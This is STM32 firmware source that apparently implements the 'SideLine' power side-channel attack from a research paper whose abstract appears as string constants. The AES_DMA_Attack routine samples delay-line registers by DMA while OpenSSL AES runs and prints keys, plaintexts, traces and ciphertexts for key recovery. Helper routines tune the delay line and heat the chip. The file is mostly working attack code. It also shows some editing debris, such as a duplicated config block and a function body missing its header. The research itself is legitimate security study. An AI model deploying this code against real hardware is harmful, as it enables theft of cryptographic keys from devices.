/* USER CODE BEGIN Header */
/**
  ******************************************************************************
  * @file           : main.c
  * @brief          : Main program body
  ******************************************************************************
  * @attention
  *
  * <h2><center>&copy; Copyright (c) 2020 STMicroelectronics.
  * All rights reserved.</center></h2>
  *
  * This software component is licensed by ST under BSD 3-Clause license,
  * the "License"; You may not use this file except in compliance with the
  * License. You may obtain a copy of the License at:
  *                        opensource.org/licenses/BSD-3-Clause
  *
  ******************************************************************************
  */
/* USER CODE END Header */
/* Includes ------------------------------------------------------------------*/
#include "main.h"
#define ssqrt
/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */

/* USER CODE END Includes */

/* Private typedef -----------------------------------------------------------*/
/* USER CODE BEGIN PTD */

/* USER CODE END PTD */

/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */
#define AES_BUFFER_SIZE 400

//#define SD1_EN
#define SD2_EN
//#define SD3_EN
//#define SQ_EN //quad spi

#if defined SQ_EN
	#define DLYB_ADDR 0x58004000
	#define MEM_ADDR 0x58003000
#elif defined SD1_EN
	#define DLYB_ADDR 0x58006000
	#define MEM_ADDR 0x58005000
#elif defined SD2_EN
	#define DLYB_ADDR 0x58008000
	#define MEM_ADDR 0x58007000
#else
	#define DLYB_ADDR 0x48005000
	#define MEM_ADDR 0x48004000
#endif


#define AES_DMA
/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */
char * str1 =
{
"To meet the ever-growing need for performance in  silicon devices,"
" SoC providers have been increasingly relying on software-hardware cooperation."
" By controlling hardware resources such as power or clock management from the soft-ware,"
" developers earn the possibility to build more flexible and power efficient applications."
" Despite the benefits, these hard-ware components are now exposed to software code and"
" can potentially be misused as open-doors to jeopardize trusted environments,"
" perform privilege escalation or steal cryptographic secrets."
" In this work, we introduceSideLine, a novel side-channel vector based on delay-line"
" components widely implemented in high-end SoCs. After providing"
" a detailed method on how to access and convert delay-line data into"
" power consumption information, we demonstrate that these entities can be used to perform"
" remote power side-channel attacks. We report experiments carried out on two SoCs from"
"distinct vendors and we recount several core-vs-core attack scenarios"
" in which an adversary process located in one processor core aims at"
" eavesdropping the activity of a victim process located in another core."
" For each scenario, we demonstrate the adversary ability to fully recover"
" the secret key of an OpenSSL AES running in the victim core. Even more detrimental,"
" we show that these attacks are still practicable if the victim or the attacker"
" program runs over an operatingsystem."
};

char * str2 =
{
"To meet the ever-growing need for performance in  silicon devices,"
" SoC providers have been increasingly relying on software-hardware cooperation."
" By controlling hardware resources such as power or clock management from the soft-ware,"
" developers earn the possibility to build more flexible and power efficient applications."
" Despite the benefits, these hard-ware components are now exposed to software code and"
" can potentially be misused as open-doors to jeopardize trusted environments,"
" perform privilege escalation or steal cryptographic secrets."
" In this work, we introduceSideLine, a novel side-channel vector based on delay-line"
" components widely implemented in high-end SoCs. After providing"
" a detailed method on how to access and convert delay-line data into"
" power consumption information, we demonstrate that these entities can be used to perform"
" remote power side-channel attacks. We report experiments carried out on two SoCs from"
"distinct vendors and we recount several core-vs-core attack scenarios"
" in which an adversary process located in one processor core aims at"
" eavesdropping the activity of a victim process located in another core."
" For each scenario, we demonstrate the adversary ability to fully recover"
" the secret key of an OpenSSL AES running in the victim core. Even more detrimental,"
" we show that these attacks are still practicable if the victim or the attacker"
" program runs over an operatingsystem.ERROR"
};
/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
UART_HandleTypeDef huart3;
DMA_HandleTypeDef hdma_memtomem_dma2_stream0;

/* USER CODE BEGIN PV */
#if defined AES_DMA
static uint32_t aDST_Buffer[AES_BUFFER_SIZE];
#endif

//For DMA transfer
static __IO uint32_t transferErrorDetected; /* Set to 1 if an error transfer is detected */
uint32_t transferComplete; /* Set to 1 if DMA transfer has ended */

//For Hardware performance counter access
volatile uint32_t *DWT_CYCCNT = (uint32_t *) 0xE0001004;

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/
void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_USART3_UART_Init(void);
float Measure_Variability(uint8_t dlval, uint16_t clkval);
float Force_Variability(uint8_t dlval, uint16_t clkval);
int Increase_Temperature(uint32_t attempts);
void Decrease_Temperature(uint32_t duration);
uint8_t Test_Variability(uint8_t dlmin, uint8_t dlmax,uint8_t clkmin, uint8_t clkmax);
static void MX_DMA_Init(void);
static void Write_Register(uintptr_t Addr, uint32_t Value);
static uint32_t Read_Register(uintptr_t Addr);
static void Modify_Register(uintptr_t Addr, uint32_t Value,uint32_t mask);
void Decode_And_Print_DelayLine(uint32_t delayvalue);
void AES_DMA_Attack(void);
void printBits(uint8_t size, uint32_t data);
static void Init_PerfCounters(void);

/* USER CODE BEGIN PFP */
#ifdef __GNUC__
/* With GCC, small printf (option LD Linker->Libraries->Small printf
   set to 'Yes') calls __io_putchar() */
#define PUTCHAR_PROTOTYPE int __io_putchar(int ch)
#else
#define PUTCHAR_PROTOTYPE int fputc(int ch, FILE *f)
#endif /* __GNUC__ */

#ifdef __GNUC__
#define GETCHAR_PROTOTYPE int __io_getchar (void)
#else
#define GETCHAR_PROTOTYPE int fgetc(FILE * f)
#endif /* __GNUC__ */


/* Private define ------------------------------------------------------------*/
/* USER CODE BEGIN PD */

/* USER CODE END PD */

/* Private macro -------------------------------------------------------------*/
/* USER CODE BEGIN PM */

/* USER CODE END PM */

/* Private variables ---------------------------------------------------------*/
UART_HandleTypeDef huart3;

/* USER CODE BEGIN PV */

/* USER CODE END PV */

/* Private function prototypes -----------------------------------------------*/


/* USER CODE BEGIN PFP */
void SystemClock_Config(void);
static void MX_DMA_Init(void);
static void MX_GPIO_Init(void);
static void MX_USART3_UART_Init(void);
static void TransferComplete(DMA_HandleTypeDef *DmaHandle);
static void TransferError(DMA_HandleTypeDef *DmaHandle);
/* USER CODE END PFP */

/* Private user code ---------------------------------------------------------*/
/* USER CODE BEGIN 0 */
uint8_t unit_val = 0;
/* USER CODE END 0 */

/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
  /* USER CODE BEGIN 1 */
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();

  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  if(IS_ENGINEERING_BOOT_MODE())
  {
    /* Configure the system clock */
    SystemClock_Config();
  }

  /* USER CODE BEGIN SysInit */
	/*HW semaphore Clock enable*/
	__HAL_RCC_HSEM_CLK_ENABLE();
  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
  MX_USART3_UART_Init();
  Init_PerfCounters();
  /* USER CODE BEGIN 2 */
  BSP_LED_Init(LED7);

  printf("\n\r\n\r Welcome! \n\r");

	#if defined AES_DMA
	//Modify SDMMC2 frequency to max
	Modify_Register(MEM_ADDR + 0x4,0x1,0x2ff);
	//Disable the length sampling by setting SEN bit to ‘0’.
	Write_Register(DLYB_ADDR,0x1);
	//wait for synchro
	HAL_Delay(200);
	#endif

	#if defined AES_DMA
	transferErrorDetected = 0;
	MX_DMA_Init();
	/* Select Callbacks functions called after Transfer complete and Transfer error */
	HAL_DMA_RegisterCallback(&hdma_memtomem_dma2_stream0, HAL_DMA_XFER_CPLT_CB_ID, TransferComplete);
	HAL_DMA_RegisterCallback(&hdma_memtomem_dma2_stream0, HAL_DMA_XFER_ERROR_CB_ID, TransferError);


	#endif

	AES_DMA_Attack();

  /* USER CODE END 2 */


  /* USER CODE BEGIN WHILE */
  while (1)
  {
    /* USER CODE END WHILE */
	  BSP_LED_Toggle(LED7);
	  HAL_Delay(1000);
    /* USER CODE BEGIN 3 */
  }
  /* USER CODE END 3 */
}

/**
  * @brief System Clock Configuration
  * @retval None
  */
{
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};

  /** Initializes the RCC Oscillators according to the specified parameters
  * in the RCC_OscInitTypeDef structure.
  */
  RCC_OscInitStruct.OscillatorType = RCC_OSCILLATORTYPE_HSI|RCC_OSCILLATORTYPE_LSI;
  RCC_OscInitStruct.HSIState = RCC_HSI_ON;
  RCC_OscInitStruct.HSICalibrationValue = 16;
  RCC_OscInitStruct.HSIDivValue = RCC_HSI_DIV1;
  RCC_OscInitStruct.LSIState = RCC_LSI_ON;
  RCC_OscInitStruct.PLL.PLLState = RCC_PLL_NONE;
  RCC_OscInitStruct.PLL2.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL2.PLLSource = RCC_PLL12SOURCE_HSI;
  RCC_OscInitStruct.PLL2.PLLM = 4;
  RCC_OscInitStruct.PLL2.PLLN = 25;
  RCC_OscInitStruct.PLL2.PLLP = 2;
  RCC_OscInitStruct.PLL2.PLLQ = 1;
  RCC_OscInitStruct.PLL2.PLLR = 1;
  RCC_OscInitStruct.PLL2.PLLFRACV = 0;
  RCC_OscInitStruct.PLL2.PLLMODE = RCC_PLL_INTEGER;
  RCC_OscInitStruct.PLL3.PLLState = RCC_PLL_ON;
  RCC_OscInitStruct.PLL3.PLLSource = RCC_PLL3SOURCE_HSI;
  RCC_OscInitStruct.PLL3.PLLM = 4;
  RCC_OscInitStruct.PLL3.PLLN = 25;
  RCC_OscInitStruct.PLL3.PLLP = 2;
  RCC_OscInitStruct.PLL3.PLLQ = 17;
  RCC_OscInitStruct.PLL3.PLLR = 37;
  RCC_OscInitStruct.PLL3.PLLRGE = RCC_PLL3IFRANGE_1;
  RCC_OscInitStruct.PLL3.PLLFRACV = 0;
  RCC_OscInitStruct.PLL3.PLLMODE = RCC_PLL_INTEGER;
  RCC_OscInitStruct.PLL4.PLLState = RCC_PLL_NONE;
  if (HAL_RCC_OscConfig(&RCC_OscInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
  /** RCC Clock Config
  */
  RCC_ClkInitStruct.ClockType = RCC_CLOCKTYPE_HCLK|RCC_CLOCKTYPE_ACLK
                              |RCC_CLOCKTYPE_PCLK1|RCC_CLOCKTYPE_PCLK2
                              |RCC_CLOCKTYPE_PCLK3|RCC_CLOCKTYPE_PCLK4
                              |RCC_CLOCKTYPE_PCLK5;
  RCC_ClkInitStruct.AXISSInit.AXI_Clock = RCC_AXISSOURCE_PLL2;
  RCC_ClkInitStruct.AXISSInit.AXI_Div = RCC_AXI_DIV1;
  RCC_ClkInitStruct.MCUInit.MCU_Clock = RCC_MCUSSOURCE_PLL3;
  RCC_ClkInitStruct.MCUInit.MCU_Div = RCC_MCU_DIV2;
  RCC_ClkInitStruct.APB4_Div = RCC_APB4_DIV2;
  RCC_ClkInitStruct.APB5_Div = RCC_APB5_DIV4;
  RCC_ClkInitStruct.APB1_Div = RCC_APB1_DIV2;
  RCC_ClkInitStruct.APB2_Div = RCC_APB2_DIV2;
  RCC_ClkInitStruct.APB3_Div = RCC_APB3_DIV2;

  if (HAL_RCC_ClockConfig(&RCC_ClkInitStruct) != HAL_OK)
  {
    Error_Handler();
  }
}


/**
  * @brief USART3 Initialization Function
  * @param None
  * @retval None
  */
static void MX_USART3_UART_Init(void)
{

  /* USER CODE BEGIN USART3_Init 0 */

  /* USER CODE END USART3_Init 0 */

  /* USER CODE BEGIN USART3_Init 1 */

  /* USER CODE END USART3_Init 1 */
  huart3.Instance = USART3;
  huart3.Init.BaudRate = 480600;
  huart3.Init.WordLength = UART_WORDLENGTH_8B;
  huart3.Init.StopBits = UART_STOPBITS_1;
  huart3.Init.Parity = UART_PARITY_NONE;
  huart3.Init.Mode = UART_MODE_TX_RX;
  huart3.Init.HwFlowCtl = UART_HWCONTROL_NONE;
  huart3.Init.OverSampling = UART_OVERSAMPLING_16;
  huart3.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
  huart3.Init.ClockPrescaler = UART_PRESCALER_DIV1;
  huart3.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
  if (HAL_UART_Init(&huart3) != HAL_OK)
  {
    Error_Handler();
  }
  if (HAL_UARTEx_SetTxFifoThreshold(&huart3, UART_TXFIFO_THRESHOLD_1_8) != HAL_OK)
  {
    Error_Handler();
  }
  if (HAL_UARTEx_SetRxFifoThreshold(&huart3, UART_RXFIFO_THRESHOLD_1_8) != HAL_OK)
  {
    Error_Handler();
  }
  if (HAL_UARTEx_DisableFifoMode(&huart3) != HAL_OK)
  {
    Error_Handler();
  }
  /* USER CODE BEGIN USART3_Init 2 */

  /* USER CODE END USART3_Init 2 */

}

/**
  * @brief GPIO Initialization Function
  * @param None
  * @retval None
  */
static void MX_GPIO_Init(void)
{

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
  __HAL_RCC_GPIOH_CLK_ENABLE();
  __HAL_RCC_GPIOB_CLK_ENABLE();

}

/* USER CODE BEGIN 4 */
PUTCHAR_PROTOTYPE
{
  /* Place your implementation of fputc here */
  /* e.g. write a character to the USART3 and Loop until the end of transmission */
  HAL_UART_Transmit(&huart3, (uint8_t *)&ch, 1, 0xFFFF);

  return ch;
}

GETCHAR_PROTOTYPE
{
  uint8_t ch = 0;

  /* Clear the Overrun flag just before receiving the first character */
  __HAL_UART_CLEAR_OREFLAG(&huart3);

  HAL_UART_Receive(&huart3, (uint8_t *)&ch, 1, 0xFFFF);
  HAL_UART_Transmit(&huart3, (uint8_t *)&ch, 1, 0xFFFF);
  return ch;
}


static void Init_PerfCounters(void)
{
	volatile uint32_t *DWT_CONTROL = (uint32_t *) 0xE0001000;
	volatile uint32_t *DWT_CYCCNT = (uint32_t *) 0xE0001004;
	volatile uint32_t *DEMCR = (uint32_t *) 0xE000EDFC;
	volatile uint32_t *LAR  = (uint32_t *) 0xE0001FB0;   // <-- added lock access register
	//SETUP M4 PEROFRMANCE COUNTER
	*DEMCR = *DEMCR | 0x01000000;     // enable trace
	*LAR = 0xC5ACCE55;                // <-- added unlock access to DWT (ITM, etc.)registers
	*DWT_CYCCNT = 0;                  // clear DWT cycle counter
	*DWT_CONTROL = *DWT_CONTROL | 1;  // enable DWT cycle counter

}

/**
  * Enable DMA controller clock
  * Configure DMA for memory to memory transfers
  *   hdma_memtomem_dma2_stream0
  */
static void MX_DMA_Init(void)
{
  /* DMA controller clock enable */
  __HAL_RCC_DMA2_CLK_ENABLE();
  __HAL_RCC_DMAMUX_CLK_ENABLE();

  /* Configure DMA request hdma_memtomem_dma2_stream0 on DMA2_Stream0 */
  hdma_memtomem_dma2_stream0.Instance = DMA2_Stream0;
  hdma_memtomem_dma2_stream0.Init.Request = DMA_REQUEST_MEM2MEM;   /*DMA_REQUEST_GENERATOR0;*/
  hdma_memtomem_dma2_stream0.Init.Direction = DMA_MEMORY_TO_MEMORY;  /*DMA_PERIPH_TO_MEMORY;*/
  hdma_memtomem_dma2_stream0.Init.PeriphInc = /*DMA_PINC_ENABLE;*/ DMA_PINC_DISABLE;
  hdma_memtomem_dma2_stream0.Init.MemInc = DMA_MINC_ENABLE;
  hdma_memtomem_dma2_stream0.Init.PeriphDataAlignment = DMA_PDATAALIGN_WORD;
  hdma_memtomem_dma2_stream0.Init.MemDataAlignment = DMA_MDATAALIGN_WORD;
  hdma_memtomem_dma2_stream0.Init.Mode = DMA_NORMAL;
  hdma_memtomem_dma2_stream0.Init.Priority = DMA_PRIORITY_VERY_HIGH; /*DMA_PRIORITY_LOW*/;
  hdma_memtomem_dma2_stream0.Init.FIFOMode = DMA_FIFOMODE_ENABLE;
  hdma_memtomem_dma2_stream0.Init.FIFOThreshold = DMA_FIFO_THRESHOLD_FULL;
  hdma_memtomem_dma2_stream0.Init.MemBurst = DMA_MBURST_INC4;
  hdma_memtomem_dma2_stream0.Init.PeriphBurst = DMA_PBURST_INC4;
  if (HAL_DMA_Init(&hdma_memtomem_dma2_stream0) != HAL_OK)
  {
    Error_Handler();
  }

  /* DMA interrupt init */
  /* DMA2_Stream0_IRQn interrupt configuration */
  HAL_NVIC_SetPriority(DMA2_Stream0_IRQn, DEFAULT_IRQ_PRIO, 0);
  HAL_NVIC_EnableIRQ(DMA2_Stream0_IRQn);

}


/* USER CODE BEGIN 4 */
/**
  * @brief  DMA conversion complete callback
  * @note   This function is executed when the transfer complete interrupt
  *         is generated
  * @retval None
  */
static void TransferComplete(DMA_HandleTypeDef *DmaHandle)
{
  /* Turn LED7 on: Transfer correct */
	transferComplete = 1;
	BSP_LED_On(LED7);
}

/**
  * @brief  DMA conversion error callback
  * @note   This function is executed when the transfer error interrupt
  *         is generated during DMA transfer
  * @retval None
  */
static void TransferError(DMA_HandleTypeDef *DmaHandle)
{
	transferErrorDetected = 1;
	Error_Handler();
}

void Decode_And_Print_DelayLine(uint32_t delayvalue)
{
	int temp = 0;

	for(int i = 0 ; i < 3 ; i++)
	{
		switch((delayvalue>>(16+i*4))&0xF)
		{
			case 0x8:
				temp = temp + 9;
				break;
			case 0xc:
				temp = temp + 8;
				break;
			case 0xe:
				temp = temp + 7;
				break;
			case 0x4:
				temp = temp + 6;
				break;
			case 0x6:
				temp = temp + 5;
				break;
			case 0x7:
				temp = temp + 4;
				break;
			case 0x2:
				temp = temp + 3;
				break;
			case 0x3:
				temp = temp + 2;
				break;
			case 0x1:
				temp = temp + 1;
				break;
			case 0x0:
				temp = temp + 0;
				break;
			default:
				printf("error");
				break;
		}
	}

	printf("%c",temp+20);
}

float Force_Variability(uint8_t dlval, uint16_t clkval)
{
	int attempts = 50;
	uint32_t clockcycles = 0;
	float currentVar = 0.0;
	float lastVar = 0.0;
	float BestVar = 10.0; //minimum best var to beat !

	printf("\n\rForce variability");

	for(int iTest = 0 ; iTest < attempts ; iTest++)
	{
		printf("\n\r\n\rAttempt: %d",iTest);
		currentVar = Measure_Variability(dlval,clkval);
		printf("\n\r    Current Var is: %f",currentVar);

		//if(currentVar >= lastVar)
		//{
			*DWT_CYCCNT=0;
			Increase_Temperature(500000);
			clockcycles = *DWT_CYCCNT;
			printf("\n\r    Increase Temp duration: %f ms",((1.0/209000)*clockcycles));
		/*}
		else
		{
			*DWT_CYCCNT=0;
			Decrease_Temperature(5000);
			clockcycles = *DWT_CYCCNT;
			printf("\n\r    Decrease Temp duration: %f ms",((1.0/209000)*clockcycles));
		}*/

		if(currentVar >= BestVar)
		{
			BestVar = currentVar;
		}

		lastVar = currentVar;
	}

	return currentVar;
}

int Increase_Temperature(uint32_t attempts)
{
	int ret = 0;//,clockcycles = 0;


	for(int iTest = 0 ; iTest < attempts ; iTest++)
	{
		//*DWT_CYCCNT=0;

		//clockcycles = *DWT_CYCCNT;
		//printf("\n\r    strcmp duration: %f ms",((1.0/209000)*clockcycles));

		#ifdef strmcp
		ret = strcmp(str1,str2);
		#endif

		#ifdef ssqrt
		uint64_t rnd = rand();
		double r_d = sqrt((double)rnd) * sqrt((double)rnd);
		long double r_ld = sqrtl((long double)rnd) * sqrtl((long double)r_d);
		ret = (int)r_ld;
		#endif

	}

	return ret;
}

void Decrease_Temperature(uint32_t duration)
{
	HAL_Delay(duration);
}

float Measure_Variability(uint8_t dlval, uint16_t clkval)
{
	float mean = 0.0;
	float var = 0.0;
	float globalMean = 0.0;
	float globalVar = 0.0;
	unsigned int nSample = 400;
	unsigned int nTrace = 1000;
	unsigned int count = 0;

	//Modify SDMMC2 frequency to max
	Modify_Register(MEM_ADDR + 0x4,clkval,0x2ff);
	printf("\n\r    CLK :%d, DLYB: %d",clkval,dlval);



	globalMean = 0.0;
	globalVar = 0.0;

	for(int iTrace = 0 ; iTrace < nTrace ; iTrace++)
	{
		var = 0.0;
		mean = 0.0;

		//Disable the length sampling by setting SEN bit to ‘0’.
		Write_Register(DLYB_ADDR,0x1);

		//Enable the length sampling by setting SEN bit to ‘1’.
		Write_Register(DLYB_ADDR,0x3);

		//Enable all delay cells by setting SEL bits to 12 and set UNIT to 119 and re-launch LENGTH SAMPLING
		*(volatile uint32_t *)(DLYB_ADDR + 0x4) = 0xc + (dlval << 8);

		/* STart DMA transaction */
		transferComplete = 0;

		// Launch DMA
		if (HAL_DMA_Start_IT(&hdma_memtomem_dma2_stream0, DLYB_ADDR + 0x4, (uint32_t)&aDST_Buffer, nSample) != HAL_OK){Error_Handler();}

		// Wait for end DMA transfer
		while(transferComplete == 0){}

		// compute mean
		for(int iSample = 0 ; iSample < nSample; iSample++)
		{
			count = 0;
			for(int i = 0 ; i < 12 ; i++)
			{
				count += (aDST_Buffer[iSample] >> (16+i)) & 1;
			}

			mean += (float)count;
		}

		mean /= (float)nSample;
		globalMean += mean;

		//printf("\n\rMean: %f",mean);

		// compute variance
		for(int iSample = 0 ; iSample < nSample; iSample++)
		{
			count = 0;
			for(int i = 0 ; i < 12 ; i++)
			{
				count += (aDST_Buffer[iSample] >> (16+i)) & 1;
			}

			var += pow((float)count - mean,2);
		}

		var /= (float)(nSample-1);
		globalVar += var;


		//printf("\n\rVariance: %f",var);

		/*end transaction*/
		Write_Register(DLYB_ADDR,0x1);

	}

	//printf("\n\r    Global Mean: %f",globalMean);

	return globalVar;
};

uint8_t Test_Variability(uint8_t dlmin, uint8_t dlmax,uint8_t clkmin, uint8_t clkmax)
{
	printf("\n\rTesting variability");

	int bestVal = 0;
	float bestVar = 0.0;
	float mean = 0.0;
	float var = 0.0;
	float globalMean = 0.0;
	float globalVar = 0.0;
	unsigned int nSample = 400;
	unsigned int nTrace = 1000;
	unsigned int count = 0;
	unsigned int regVal = 0;

	for(int clkvalue = clkmin ; clkvalue <= clkmax ; clkvalue++)
	{
		//Modify SDMMC2 frequency to max
		Modify_Register(MEM_ADDR + 0x4,clkvalue,0x2ff);

		for(int DLvalue = dlmin ; DLvalue <= dlmax ; DLvalue++)
		{
			globalMean = 0.0;
			globalVar = 0.0;
			printf("\n\rDLvalue : %d DLYB_CFGR = %08x",DLvalue, 0xc + (DLvalue << 8));

			for(int iTrace = 0 ; iTrace < nTrace ; iTrace++)
			{
				var = 0.0;
				mean = 0.0;

				//Disable the length sampling by setting SEN bit to ‘0’.
				Write_Register(DLYB_ADDR,0x1);

				//Enable the length sampling by setting SEN bit to ‘1’.
				Write_Register(DLYB_ADDR,0x3);

				//Enable all delay cells by setting SEL bits to 12 and set UNIT to 119 and re-launch LENGTH SAMPLING
				*(volatile uint32_t *)(DLYB_ADDR + 0x4) = 0xc + (DLvalue << 8);

				/* STart DMA transaction */
				transferComplete = 0;

				// Launch DMA
				if (HAL_DMA_Start_IT(&hdma_memtomem_dma2_stream0, DLYB_ADDR + 0x4, (uint32_t)&aDST_Buffer, nSample) != HAL_OK){Error_Handler();}

				// Wait for end DMA transfer
				while(transferComplete == 0){}

				// compute mean
				for(int iSample = 0 ; iSample < nSample; iSample++)
				{
					count = 0;
					for(int i = 0 ; i < 12 ; i++)
					{
						count += (aDST_Buffer[iSample] >> (16+i)) & 1;
					}

					mean += (float)count;
				}

				mean /= (float)nSample;
				globalMean += mean;

				//printf("\n\rMean: %f",mean);

				// compute variance
				for(int iSample = 0 ; iSample < nSample; iSample++)
				{
					count = 0;
					for(int i = 0 ; i < 12 ; i++)
					{
						count += (aDST_Buffer[iSample] >> (16+i)) & 1;
					}

					var += pow((float)count - mean,2);
				}

				var /= (float)(nSample-1);
				globalVar += var;


				//printf("\n\rVariance: %f",var);

				/*end transaction*/
				Write_Register(DLYB_ADDR,0x1);


			}
			regVal = (aDST_Buffer[50] >> 16) & 0xFFF;
			printf("\n\rRegisterView: ");
			printBits(12,regVal);
			printf("\n\rGlobal Mean: %f",globalMean);
			printf("\n\rGlobal Var: %f",globalVar);

			if(globalVar > bestVar)
			{
				bestVar = globalVar;
				bestVal = DLvalue;

			}

		}
	}

	printf("\n\r\n\rThe Best DL value found is %d\n\r",bestVal);
	HAL_Delay(2000);

	return bestVal;
}

void AES_DMA_Attack(void)
{
	AES_KEY_OSSL keydma;
	//int cycleAES = 0;
	;//int cycleDMA = 0;
	uint8_t ptArray[16];
	uint8_t ctArray[16];
	uint8_t keyArray[16];

	printf("****Start Openssl DMA AES attack****\n\r");

	unit_val = 119;
	//Force_Variability(119, 1);



	// Generate random key and print it
	printf("\n\rkey : ");
	for(int k_i = 0 ; k_i < 16 ; k_i++){keyArray[k_i] = ((uint8_t)rand());printf("%02x",keyArray[k_i]);}
	printf("\n\r");

	//AES key expansion
	AES_set_encrypt_key(keyArray,128,&keydma);

	// loop = number of traces acquired
	for(int num = 0 ; num < 100000000 ; num++)
	{
		// Generate random plain text and print it
		printf("\n\rplaintext : ");
		for(int u = 0; u<16 ; u++){ptArray[u] = (uint8_t)rand();printf("%02x",ptArray[u]);}
		printf("\n\r");

		//Disable the length sampling by setting SEN bit to ‘0’.
		Write_Register(DLYB_ADDR,0x1);

		//Enable the length sampling by setting SEN bit to ‘1’.
		Write_Register(DLYB_ADDR,0x3);

		//Enable all delay cells by setting SEL bits to 12 and set UNIT to 119 and re-launch LENGTH SAMPLING
		//*(volatile uint32_t *)(DLYB_ADDR + 0x4) = 0x0000770c;
		*(volatile uint32_t *)(DLYB_ADDR + 0x4) = 0xc + (unit_val << 8);

		/* STart DMA transaction */
		transferComplete = 0;

		// Launch DMA
		if (HAL_DMA_Start_IT(&hdma_memtomem_dma2_stream0, DLYB_ADDR + 0x4, (uint32_t)&aDST_Buffer, AES_BUFFER_SIZE) != HAL_OK){Error_Handler();}

		//clear DWT cycle counter
		//*DWT_CYCCNT = 0;

		// Launch encryptions
		//for(int i = 0 ; i < 2; i++)
		//{
		for(int i = 0 ; i < 500 ; i++){}
		AES_encrypt(ptArray,ctArray,&keydma);
		AES_encrypt(ptArray,ctArray,&keydma);
		//for(int i = 0 ; i < 1000 ; i++){}

		//cycleAES = *DWT_CYCCNT;
		//}

		while(transferComplete == 0){}

		// Print DWT cycle counter value
		//cycleDMA = *DWT_CYCCNT;

		// Print Samples
		for(int i = 100 ; i < AES_BUFFER_SIZE ; i++)
		{
			Decode_And_Print_DelayLine(aDST_Buffer[i]);
		}

		//print time
		//printf ("\n\rtime : %.2f",(double)(1.0/209.0)*(double)cycleAES);
		//printf ("\n\rnb cycles AES : %d",(int)cycleAES);
		//printf ("\n\rnb cycles : %d",(int)cycleDMA);

		// Print cipher text
		printf("\n\rciphertext : ");
		for(int u = 0; u<16 ; u++){printf("%02x",ctArray[u]);}

		/*end transaction*/
		Write_Register(DLYB_ADDR,0x1);
	}
	printf("\n\rEnd of the AES sequence!!\n\r");
}

void printBits(uint8_t size, uint32_t data)
{
    for (int i = size-1; i >= 0; i--) {
            printf("%lu", (data>>i)  & 1);
    }
}

static void Write_Register(uintptr_t Addr, uint32_t Value)
{
    volatile uint32_t *LocalAddr = (volatile uint32_t *)Addr;
    *LocalAddr = Value;
}

static uint32_t Read_Register(uintptr_t Addr)
{
	return *(volatile uint32_t *) Addr;
}

static void Modify_Register(uintptr_t Addr, uint32_t Value,uint32_t mask)
{
    uint32_t data = Read_Register(Addr);
    data = (data & (~mask)) | Value;
    Write_Register(Addr,data);
}
/* USER CODE END 4 */

/**
  * @brief  This function is executed in case of error occurrence.
  * @retval None
  */
void Error_Handler(void)
{
  /* USER CODE BEGIN Error_Handler_Debug */
  /* User can add his own implementation to report the HAL error return state */
	  BSP_LED_Toggle(LED7);
	  HAL_Delay(100);
  /* USER CODE END Error_Handler_Debug */
}

#ifdef  USE_FULL_ASSERT
/**
  * @brief  Reports the name of the source file and the source line number
  *         where the assert_param error has occurred.
  * @param  file: pointer to the source file name
  * @param  line: assert_param error line source number
  * @retval None
  */
void assert_failed(uint8_t *file, uint32_t line)
{
  /* USER CODE BEGIN 6 */
  /* User can add his own implementation to report the file name and line number,
     tex: printf("Wrong parameters value: file %s on line %d\r\n", file, line) */
  /* USER CODE END 6 */
}
#endif /* USE_FULL_ASSERT */

/************************ (C) COPYRIGHT STMicroelectronics *****END OF FILE****/